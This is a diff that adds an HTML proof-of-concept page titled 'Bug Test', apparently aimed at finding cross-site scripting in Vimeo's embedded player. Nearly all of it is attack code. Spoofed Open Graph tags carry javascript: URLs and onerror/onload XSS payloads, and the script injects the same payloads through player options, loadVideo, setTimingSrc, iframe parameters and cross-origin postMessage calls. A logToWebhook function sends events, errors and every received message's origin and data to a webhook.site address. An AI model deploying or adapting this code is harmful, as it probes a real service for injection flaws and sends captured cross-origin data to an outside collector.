@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta property="og:site_name" content="Vimeo">
+    <meta property="og:url" content="https://vimeo.com/403530213">
+    <meta property="og:type" content="video.other">
+    <meta property="og:title" content="Test by Jxint">
+    <meta property="og:description" content="H4CK1NG 1S L1F3">
+    <meta property="og:image" content="https://i.vimeocdn.com/video/873029368-78a366b9407757e066a37718d766be53d3cb90d7f27708590ca16a1400e95b89-d">
+    <meta property="og:video" content="javascript:window.open('https://example.com','_blank')">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213/config?player_id=%22%3E%3Csvg%20onload=window.open(%27https://example.com%27)%3E">
+    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?player_id=%22%3E%3Cimg%20src=x%20onerror=window.open(%27https://example.com%27)%3E">
+    <meta property="og:video:type" content="text/html">
+    <meta property="og:video:width" content="640">
+    <meta property="og:video:height" content="360">
+    <title>Bug Test</title>
+    <script src="https://player.vimeo.com/api/player.js"></script>
+    <script>
+        function logToWebhook(data) {
+            const img = new Image();
+            img.src = `https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?data=${encodeURIComponent(JSON.stringify(data))}`;
+        }
+
+        async function attemptExploit() {
+            try {
+                // Initialize player with malicious config
+                const player = new Vimeo.Player('vimeo-player', {
+                    url: 'https://player.vimeo.com/video/403530213',
+                    autoplay: true,
+                    interactive_params: {
+                        'background': 'javascript:window.open("https://example.com")',
+                        'on_site': '"><img src=x onerror=window.open("https://example.com")>'
+                    },
+                    byline: '"><img src=x onerror=window.open("https://example.com")>',
+                    portrait: false,
+                    title: false,
+                    speed: true,
+                    transparent: false,
+                    controls: false
+                });
+
+                // Listen for player events that might trigger window.open
+                player.on('play', function() {
+                    try {
+                        // Method 1: Try to open window directly
+                        window.open('https://example.com', '_blank');
+                        
+                        // Method 2: Try to inject into player URL
+                        player.loadVideo('403530213?player_id="><img src=x onerror=window.open("https://example.com")>');
+                        
+                        // Method 3: Try to exploit timing API
+                        player.setTimingSrc({
+                            url: 'javascript:window.open("https://example.com")',
+                            callback: 'window.open("https://example.com")'
+                        });
+
+                        logToWebhook({
+                            type: 'play_event_triggered',
+                            timestamp: new Date().toISOString()
+                        });
+                    } catch(e) {
+                        logToWebhook({
+                            type: 'play_event_error',
+                            error: e.toString(),
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                });
+
+                // Create iframe with autoplay and custom parameters
+                const frame = document.createElement('iframe');
+                frame.src = 'https://player.vimeo.com/video/403530213?autoplay=1&player_id=' + encodeURIComponent('"><img src=x onerror=window.open("https://example.com")>');
+                frame.width = '640';
+                frame.height = '360';
+                frame.allow = 'autoplay; fullscreen';
+                document.getElementById('vimeo-player').appendChild(frame);
+
+                // Try to exploit the iframe
+                frame.onload = () => {
+                    try {
+                        // Try to exploit player API methods
+                        frame.contentWindow.postMessage({
+                            method: 'addEventListener',
+                            value: 'play',
+                            data: {
+                                player_id: '"><img src=x onerror=window.open("https://example.com")>',
+                                method: 'setColor',
+                                value: 'javascript:window.open("https://example.com")'
+                            }
+                        }, '*');
+
+                        // Try to exploit player configuration
+                        frame.contentWindow.postMessage({
+                            method: 'setTimingSrc',
+                            value: {
+                                url: 'javascript:window.open("https://example.com")',
+                                callback: 'window.open("https://example.com")'
+                            }
+                        }, '*');
+
+                        logToWebhook({
+                            type: 'frame_loaded',
+                            timestamp: new Date().toISOString()
+                        });
+                    } catch(e) {
+                        logToWebhook({
+                            type: 'frame_error',
+                            error: e.toString(),
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                };
+            } catch(e) {
+                logToWebhook({
+                    type: 'error',
+                    error: e.toString(),
+                    timestamp: new Date().toISOString()
+                });
+            }
+        }
+
+        // Listen for messages from iframe
+        window.onmessage = (e) => {
+            if(e.data && e.data.event === 'play') {
+                try {
+                    window.open('https://example.com', '_blank');
+                } catch(e) {}
+            }
+            
+            logToWebhook({
+                type: 'message_received',
+                origin: e.origin,
+                data: e.data,
+                timestamp: new Date().toISOString()
+            });
+        };
+
+        window.onload = attemptExploit;
+    </script>
+</head>
+<body>
+    <div id="vimeo-player"></div>
+</body>
+</html>
